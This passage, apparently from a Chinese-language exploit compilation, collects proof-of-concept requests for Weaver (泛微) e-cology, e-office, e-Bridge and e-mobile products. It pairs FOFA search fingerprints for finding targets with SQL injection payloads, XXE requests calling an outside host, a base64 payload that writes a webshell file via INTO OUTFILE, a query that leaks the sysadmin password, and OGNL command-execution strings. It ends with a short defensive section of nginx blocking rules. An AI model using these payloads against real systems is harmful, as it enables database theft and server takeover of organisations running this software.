GET /cpt/capital/CptInstock1Ajax.jsp?id=-99+UNION+ALL+SELECT+@@VERSION,1# HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
  
### 2.1.14泛微E-Cology系统接口deleteRequestInfoByXml存在XXE漏洞  
  
泛微e-cology是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。泛微e-cology系统接口/rest/ofs/deleteRequestInfoByXml  
 存在XXE漏洞  
- fofa  
app="泛微-协同商务系统"  
- poc  
```
POST /rest/ofs/deleteRequestInfoByXml HTTP/1.1
Host: 
Content-Type: application/xml
Content-Length: 131

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE syscode SYSTEM "http://hsdtcwwetk.dgrh3.cn">
<M><syscode>&send;</syscode></M>
```  
  
  
### 2.1.15泛微E-Cology系统接口ReceiveCCRequestByXml存在XXE漏洞  
  
泛微e-cology是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。泛微e-cology系统接口/rest/ofs/ReceiveCCRequestByXml  
 存在XXE漏洞  
- fofa  
app="泛微-协同商务系统"  
- poc  
```
POST /rest/ofs/ReceiveCCRequestByXml HTTP/1.1
Host:{{Hostname}}
User-Agent:Mozilla/5.0(WindowsNT10.0;WOW64)AppleWebKit/537.36(KHTML, likeGecko)Chrome/71.0.3578.98Safari/537.36
Content-Type:application/xml

<?xmlversion="1.0"encoding="utf-8"?>
<!DOCTYPEsyscodeSYSTEM"http://xxx.xxxx.com">
<M><syscode>&send;</syscode></M>
```  
  
  
### 2.1.16泛微E-Cology系统接口SignatureDownLoad存在SQL注入漏洞  
- fofa  
app="泛微-OA（e-cology）"  
- poc  
```
GET /weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27 HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close
```  
### 2.1.17泛微E-office-10接口leave_record.php存在SQL注入漏洞  
  
泛微eoffice10协同办公平台是一款专业的office办公的工具软件。软件支持在线多人编辑文件，并且会在第一时间收发协作需求。十分方便快捷，界面简约，布局直观清晰，操作简单，极易上手，是一款不可多得的利器。泛微E-office 10 leave_record存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息甚至getshell。  
- hunter  
web.body="eoffice10"&&web.body="eoffice_loading_tip"  
- poc  
```
GET /eoffice10/server/ext/system_support/leave_record.php?flow_id=1%27+AND+%28SELECT+4196+FROM+%28SELECT%28SLEEP%285%29%29%29LWzs%29+AND+%27zfNf%27%3D%27zfNf&run_id=1&table_field=1&table_field_name=user()&max_rows=10 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```  
### 2.1.18泛微e-office10系统schema_mysql.sql敏感信息泄露漏洞  
  
泛微 e-office 10 schema_mysql.sql敏感信息泄露漏洞  
- fofa  
body="eoffice_loading_tip" && body="eoffice10"  
- poc  
```
GET /eoffice10/empty_scene/db/schema_mysql.sql HTTP/1.1
Host:
Pragma:no-cache
Cache-Control:no-cache
Upgrade-Insecure-Requests:1
User-Agent:Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/120.0.0.0Safari/537.36
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding:gzip,deflate
Accept-Language:zh-CN,zh;q=0.9,en;q=0.8
Connection:close
Content-Type:application/x-www-form-urlencoded
Content-Length:70
```  
  
  
### 2.1.19泛微E-Office-json_common.phpSQL注入漏洞  
  
作为协同管理软件行业的领军企业，泛微有业界优秀的协同管理软件产品。在企业级移动互联大潮下，泛微发布了全新的以“移动化 社交化 平台化 云端化”四化为核心的全一代产品系列，其中泛微e-office为企业办公提供丰富应用，覆盖常见协作场景，开箱即用。满足人事、行政、财务、销售、运营、市场等不同部门协作需求，帮助组织高效人事管理。系统 json_common.php 文件存在SQL注入漏洞，容易导致数据泄露以及被远控。  
- fofa  
app="泛微-EOffice"  
- poc  
```
POST /building/json_common.php HTTP/1.1
Host: 192.168.86.128:8097
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close
Content-Length: 87
Accept: */*
Accept-Language: en
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,md5(102103122) ,4#|2|333
```  
  
  
### 2.1.20泛微E-Office系统login_other.php存在sql注入漏洞  
  
泛微E-Office系统/E-mobile/Data/login_other.php?diff=sync&auth=存在sql注入漏洞  
- fofa  
app="泛微-EOffice"  
- poc  
/E-mobile/Data/login_other.php?diff=sync&auth={"auths":[{"value":"-1' UNION SELECT 1,2,md5(123456),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51%23"}]}  
### 2.1.21泛微OA E-Office group_xml.php SQL注入漏洞  
  
1.漏洞描述  
  
泛微OA E-Office group_xml.php文件存在SQL注入漏洞，攻击者通过漏洞可以写入Webshell文件获取服务器权限  
  
2.漏洞影响  
  
泛微OA E-Office 8   
  
3.网络测绘  
  
app="泛微-EOffice"  
  
4.漏洞复现  
  
登录页面  
  
存在漏洞的文件为 inc/group_user_list/group_xml.php  
```
session_start( );
include_once( "inc/conn.php" );
include_once( "inc/xtree_xml.inc.php" );
include_once( "inc/utility_all.php" );
header( "Expires: Mon, 26 Jul 1997 05:00:00 GMT" );
header( "Cache-Control: no-cache, must-revalidate" );
header( "Pragma: no-cache" );
header( "Content-Type: text/xml" );
$pararr = explodestpar( $_REQUEST['par'] );
$groupid = $pararr['groupid'];
if ( $groupid == "" )
{
                exit( );
}
$groupurl_fix = "?";
$userurl_fix = "?";
if ( 0 < strpos( $pararr['group_url'], "?" ) )
{
                $groupurl_fix = "&";
}
if ( 0 < strpos( $pararr['user_url'], "?" ) )
{
                $userurl_fix = "&";
}
$xtreeXml = new xtreeXml( );
$xtreeXml->initXml( );
if ( $pararr['group'] == 1 )
{
                $sql = "SELECT * FROM pub_group WHERE GROUP_ID=".$groupid."";
}
else
{
                $sql = "SELECT * FROM USER,USER_GROUP WHERE USER_GROUP.GROUP_ID=".$groupid."";
}
$rs = exequery( $connection, $sql );
$row = mysql_fetch_array( $rs );
$groupmember = $row['GROUP_MEMBER'];
```  
  
$groupid没有被双引号包裹，然后造成注入。然后$groupid来自于$pararr['groupid'];其中经过了$explodestpar这个函数  
```
function explodeStPar( $enpar )
{
                $depar = base64_decode( $enpar );
                $arrpar = explode( "|", $depar );
                if ( !is_array( $arrpar ) )
                {
                                return false;
                }
                $i = 0;
                for ( ; $i < sizeof( $arrpar ); ++$i    )
                {
                                $strpar = $arrpar[$i];
                                $tmparr = explode( ":", $strpar );
                                $j = 0;
                                for ( ; $j < sizeof( $tmparr ); ++$j    )
                                {
                                                if ( $j == 0 )
                                                {
                                                                preg_match( "/\\[([a-z0-9-_].+)\\]/i", $tmparr[$j], $exp );
                                                                $par = $exp[1];
                                                }
                                                else
                                                {
                                                                preg_match( "/\\[(.*)\\]/i", $tmparr[$j], $exp );
                                                                $val = $exp[1];
                                                }
                                }
                                if ( trim( $par ) != "" )
                                {
                                                $rearr[$par] = $val;
                                }
                }
                return $rearr;
}
```  
  
构造EXP写入文件  
```
[group]:[1]|[groupid]:[1 union select '<?php phpinfo()?>',2,3,4,5,6,7,8 into outfile '../webroot/vulntest.php']
|
| base64
|
/inc/group_user_list/group_xml.php?par=W2dyb3VwXTpbMV18W2dyb3VwaWRdOlsxIHVuaW9uIHNlbGVjdCAnPD9waHAgcGhwaW5mbygpPz4nLDIsMyw0LDUsNiw3LDggaW50byBvdXRmaWxlICcuLi93ZWJyb290L3Z1bG50ZXN0LnBocCdd
```  
### 2.1.22泛微OA getdata.jsp SQL注入漏洞  
  
1.漏洞描述  
  
泛微OA V8 存在SQL注入漏洞，攻击者可以通过漏洞获取管理员权限和服务器权限  
  
2.漏洞影响  
  
泛微OA V8  
  
3.网络测绘  
  
app="泛微-协同办公OA"  
  
4.漏洞复现  
  
在getdata.jsp中，直接将request对象交给  
  
weaver.hrm.common.AjaxManager.getData(HttpServletRequest, ServletContext) :  
  
方法处理  
  
在getData方法中，判断请求里cmd参数是否为空，如果不为空，调用proc方法  
  
Proc方法4个参数，(“空字符串”,”cmd参数值”,request对象，serverContext对象)  
  
在proc方法中，对cmd参数值进行判断，当cmd值等于getSelectAllId时，再从请求中获取sql和type两个参数值，并将参数传递进getSelectAllIds（sql,type）方法中  
  
POC  
  
http://xxx.xxx.xxx.xxx/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager  
  
查询HrmResourceManager表中的password字段，页面中返回了数据库第一条记录的值（sysadmin用户的password）  
  
解密后即可登录系统  
### 2.1.23泛微OA-E-Cology接口WorkflowServiceXml存在SQL注入漏洞  
  
泛微OA E Cology 接口/services/WorkflowServiceXml 存在SQL注入漏洞，可获取数据库权限，导致数据泄露。  
- fofa  
app="泛微-OA（e-cology）"  
- poc  
```
POST /services/WorkflowServiceXml HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: text/xml
Accept-Encoding: gzip
Content-Length: 487

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver"> <soapenv:Header/>
  <soapenv:Body>
      <web:getHendledWorkflowRequestList>
        <web:in0>1</web:in0>
        <web:in1>1</web:in1>
        <web:in2>1</web:in2>
        <web:in3>1</web:in3>
        <web:in4>
            <web:string>1=1 AND 5615=5615</web:string>
        </web:in4>
      </web:getHendledWorkflowRequestList>
  </soapenv:Body>
</soapenv:Envelope>
```  
- afrog poc  
```
id: 泛微OA-E-Cology接口WorkflowServiceXml存在SQL注入漏洞

info:
  name: 泛微OA-E-Cology接口WorkflowServiceXml存在SQL注入漏洞
  author: wy876
  severity: high
  verified: true
  description: |-
    泛微OA E Cology 接口/services/WorkflowServiceXml 存在SQL注入漏洞，可获取数据库权限，导致数据泄露。
    Fofa: app="泛微-OA（e-cology）"

  reference:
    - https://github.com/wy876/POC/blob/main/泛微OA-E-Cology接口WorkflowServiceXml存在SQL注入漏洞.md
  tags: 泛微e-cology
  created: 2024/07/13


rules:
  r0:
    request:
      method: POST
      path: /services/WorkflowServiceXml
      headers:
        Content-Type: text/xml
      body: |
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver"> <soapenv:Header/>
        <soapenv:Body>
        <web:getHendledWorkflowRequestList>
        <web:in0>1</web:in0>
        <web:in1>1</web:in1>
        <web:in2>1</web:in2>
        <web:in3>1</web:in3>
        <web:in4>
            <web:string>1=1 AND 5615=5615</web:string>
        </web:in4>
        </web:getHendledWorkflowRequestList>
        </soapenv:Body>
        </soapenv:Envelope>
    expression: response.status == 200 && response.body.bcontains(b'WorkflowRequestInfo') && response.body.bcontains(b'workflowName') && response.body.bcontains(b'lastOperatorName')

expression: r0()
```  
  
  
### 2.1.24泛微云桥 e-Bridge addTaste接口SQL注入漏洞  
  
e-Bridge 提供了一套全面的办公自动化工具，包括文档管理、流程管理、协同办公、知识管理、移动办公等功能。它的核心理念是将企业内部的各种业务流程数字化，并通过云端技术实现跨部门、跨地域的协同办公和信息共享。该系统 addTaste接口存在SQL注入漏洞，通过此漏洞攻击者可获取企业数据库敏感数据。  
- fofa  
app="泛微-云桥e-Bridge"  
- hunter  
app.name="泛微云桥 e-Bridge OA"  
- poc  
```
GET /taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(9-(IF(18015%3e3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: */*
Cookie: EBRIDGE_JSESSIONID=CAE1276AE2279FD98B96C54DE624CD18; sl-session=BmCjG8ZweGWzoSGpQ1QgQg==; EBRIDGE_JSESSIONID=21D2D790531AD7941D060B411FABDC10
Accept-Encoding: gzip
SL-CE-SUID: 25
```  
  
延迟时间大于5秒  
  
漏洞来源：  
[https://mp.weixin.qq.com/s/Ej26hywx4po4sj3dSAVI_Q](https://mp.weixin.qq.com/s?__biz=MzkxNzUxMjU5OQ==&mid=2247485065&idx=1&sn=5e280ee6cbdb82feb3f6c18fc3a0d168&scene=21#wechat_redirect)  
  
### 2.1.25泛微云桥e-Bridge系统checkMobile存在SQL注入漏洞  
  
泛微云桥e-Bridge 是一款办公自动化工具，主要提供文档管理、流程管理、协同办公、知识管理和移动办公等功能。它的目标是将企业内部的各种业务流程数字化，并通过云端技术实现跨部门、跨地域的协同办公和信息共享。该产品 checkMobile接口存在SQL注入漏洞，通过此漏洞攻击者可获取企业数据库敏感数据。  
- fofa  
app="泛微-云桥e-Bridge"  
- poc  
```
POST /taste/checkMobile?company=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(5-(IF(18015%3E3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX&openid=1&source=1&userName=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept-Encoding: gzip, deflate, br, zstd
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```  
###  2.1.26某微 E-Cology 某版本 SQL注入漏洞  
```
POST /dwr/call/plaincall/DocDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
Content-Length: 191
Accept-Encoding: gzip
Connection: close
Content-Type: text/plain

callCount=1
page=
httpSessionId=
scriptSessionId=
c0-scriptName=DocDwrUtil
c0-methodName=ifNewsCheckOutByCurrentUser
c0-id=0
c0-param0=string:1 and ascii((select substring(loginid,1,1)from HrmResourceManager))=115
c0-param1=string:1
batchId=0
```  
###  2.1.27泛微e-mobile ognl注入  
  
泛微 E-Mobile 表达式注入?大概?这个洞是一个月以前，老师丢给我玩的，叫我学习一下。  
拿到的时候一脸懵逼，什么是表达式注入?去漏洞库看了一圈。  
(・。・) 噢！原来可以执行算术运算就是表达式注入呀！  
要怎么玩？当计算器用么？～ヾ(*´∇`)ﾉ  
  
一、泛微OA E-Mobile WebServer:**Apache**  
 通用部分:**apache**  
官方有两个OA。一个是**apache**  
的 一个是**Resin**  
的。**Resin**  
的也找到姿势通杀了，但是**Resin**  
涉及的站太大了。。。暂时不放出来，因为好像和S2撞洞了？因为045打了WAF的 ，我这个可以执行命令。23333 我也不知道~  
  
1、登录页面如下  
  
http://6.6.6.6/login.do?  
  
or  
  
http://6.6.6.6/login/login.do?  
  
2、当账号密码报错的时候，出现如下URL  
  
login.do?message=104&verify=  
  
3、直接改写message=的内容，试试算术运算。  
  
http://6.6.6.6/login.do?message=66*66*66-66666  
  
4、表达式注入。  
  
有的表达式注入是${code}。这里隐藏了${}，所以直接调用就行了。  
  
message=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())  
  
5、也可以通过`post`提交数据来进行注入，命令执行  
  
`post`如下数据也可以：  
  
message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&cmd=whoami  
  
参考：  
  
http://sh0w.top/index.php/archives/14/  
  
http://sh0w.top/index.php/archives/39/  
  
[https://mp.weixin.qq.com/s/EbzjQvHTl7k9flG-7lqAvA](https://mp.weixin.qq.com/s?__biz=MzAwMjgwMTU1Mg==&mid=2247484281&idx=1&sn=5dadecc65ad4c02d47e9e4c1175fab35&scene=21#wechat_redirect)  
  
  
其他表达式相关文章：  
表达式注入.pdf  
|  
原文地址  
### 2.1.28泛微E-Mobile系统接口installOperate.do存在SSRF漏洞  
  
泛微E-Mobile installOperate.do 接口处存在服务器请求伪造漏洞，未经身份验证的远程攻击者利用此漏洞扫描服务器所在的内网或本地端口，获取服务的banner信息，窥探网络结构，甚至对内网或本地运行的应用程序发起攻击，获取服务器内部敏感配置，造成信息泄露。  
  
fofa  
  
header="EMobileServer"  
  
poc  
```
GET /install/installOperate.do?svrurl=http://dnslog.cn HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
```  
  
3.SQL注入漏洞URL列表（按漏洞编号排序）  
#### 2.1.1 WorkflowCenterTreeData SQL注入  
- **请求方法**  
: POST  
  
- **URL**  
: /mobile/browser/WorkflowCenterTreeData.jsp  
  
- **参数**  
: formids=恶意payload  
  
#### 2.1.2 getSqlData SQL注入  
- **请求方法**  
: GET  
  
- **URL**  
: /Api/portal/elementEcodeAddon/getSqlData  
  
- **参数**  
: sql=恶意SQL语句  
  
#### 2.1.3 WorkPlanService前台SQL注入  
- **请求方法**  
: POST  
  
- **URL**  
: /services/WorkPlanService  
  
- **参数**  
: SOAP报文中的<web:in0>  
值  
  
#### 2.1.4 FileDownloadLocation接口注入  
- **请求方法**  
: GET  
  
- **URL**  
: /weaver/weaver.email.FileDownloadLocation  
  
- **参数**  
: mailId=恶意UNION语句  
  
#### 2.1.5 ModeDateService SQL注入  
- **请求方法**  
: POST  
  
- **URL**  
: /services/ModeDateService  
  
- **参数**  
: SOAP报文中的<mod:in2>  
值  
  
#### 2.1.6 LoginSSO.jsp注入  
- **请求方法**  
: GET  
  
- **URL**  
: /upgrade/detail.jsp/login/LoginSSO.jsp  
  
- **参数**  
: id=恶意UNION语句  
  
#### 2.1.7 HrmCareerApplyPerView.jsp注入  
- **请求方法**  
: GET  
  
- **URL**  
: /pweb/careerapply/HrmCareerApplyPerView.jsp  
  
- **参数**  
: id=恶意SQL函数  
  
#### 2.1.8 e-cology9_SQL注入  
- **请求方法**  
: POST  
  
- **URL**  
: /mobile/%20/plugin/browser.jsp  
  
- **参数**  
: keyword=三重编码恶意语句  
  
#### 2.1.9 QRcodeBuildAction注入  
- **请求方法**  
: POST  
  
- **URL**  
: /weaver/weaver.formmode.servlet.QRcodeBuildAction  
  
- **参数**  
: modeid=恶意WAITFOR语句  
  
#### 2.1.11 getLabelByModule注入  
- **请求方法**  
: GET  
  
- **URL**  
: /api/ec/dev/locale/getLabelByModule  
  
- **参数**  
: moduleCode=恶意UNION语句  
  
#### 2.1.12 BlogService注入  
- **请求方法**  
: POST  
  
- **URL**  
: /services/BlogService  
  
- **参数**  
: SOAP报文中的<web:string>  
值  
  
#### 2.1.13 CptInstock1Ajax注入  
- **请求方法**  
: GET  
  
- **URL**  
: /cpt/capital/CptInstock1Ajax.jsp  
  
- **参数**  
: id=恶意UNION语句  
  
#### 2.1.16 SignatureDownLoad注入  
- **请求方法**  
: GET  
  
- **URL**  
: /weaver/weaver.file.SignatureDownLoad  
  
- **参数**  
: markId=恶意UNION语句  
  
#### 2.1.17 leave_record.php注入  
- **请求方法**  
: GET  
  
- **URL**  
: /eoffice10/server/ext/system_support/leave_record.php  
  
- **参数**  
: flow_id=恶意SLEEP语句  
  
#### 2.1.19 json_common.php注入  
- **请求方法**  
: POST  
  
- **URL**  
: /building/json_common.php  
  
- **参数**  
: tfs=恶意UNION语句  
  
#### 2.1.20 login_other.php注入  
- **请求方法**  
: GET  
  
- **URL**  
: /E-mobile/Data/login_other.php  
  
- **参数**  
: auth=恶意UNION语句  
  
#### 2.1.21 group_xml.php注入  
- **请求方法**  
: GET  
  
- **URL**  
: /inc/group_user_list/group_xml.php  
  
- **参数**  
: par=base64编码恶意语句  
  
#### 2.1.22 getdata.jsp注入  
- **请求方法**  
: GET  
  
- **URL**  
: /js/hrm/getdata.jsp  
  
- **参数**  
: cmd=getSelectAllId&sql=恶意SQL语句  
  
#### 2.1.23 WorkflowServiceXml注入  
- **请求方法**  
: POST  
  
- **URL**  
: /services/WorkflowServiceXml  
  
- **参数**  
: SOAP报文中的<web:in4>  
值  
  
#### 2.1.24 e-Bridge addTaste注入  
- **请求方法**  
: GET  
  
- **URL**  
: /taste/addTaste  
  
- **参数**  
: mobile=恶意SLEEP语句  
  
#### 2.1.25 e-Bridge checkMobile注入  
- **请求方法**  
: POST  
  
- **URL**  
: /taste/checkMobile  
  
- **参数**  
: mobile=恶意SLEEP语句  
  
#### 2.1.26 E-Cology dwr接口注入  
- **请求方法**  
: POST  
  
- **URL**  
: /dwr/call/plaincall/DocDwrUtil.ifNewsCheckOutByCurrentUser.dwr  
  
- **参数**  
: c0-param0=恶意SQL条件  
  
#### 2.1.27 e-mobile ognl注入  
- **请求方法**  
: GET/POST  
  
- **URL**  
: /login.do  
  
- **参数**  
: message=恶意OGNL表达式  
  
4.url阻断规则  
  
# 泛微高危路径阻断规则示例  
  
location ~* ^/(mobile|services|weaver|api|eoffice10|taste) {  
  
    if ($args ~* "union|select|sleep|waitfor|exec|%0a") {  
  
        return 403;  
  
    }  
  
}  
  
  
# 特殊漏洞精准阻断  
  
location = /mobile/browser/WorkflowCenterTreeData.jsp {  
  
    deny all; # 2.1.1漏洞路径  
  
}  
  
  
location ~* \.(dwr|do)$ {  
  
    if ($request_method = POST) {  
  
        set $block 0;  
  
        if ($content_type ~* "text/plain") {  
  
            set $block 1; # 阻断2.1.26  
  
        }  
  
        if ($block = 1) { return 403; }  
  
    }  
  
}  
  
  
  
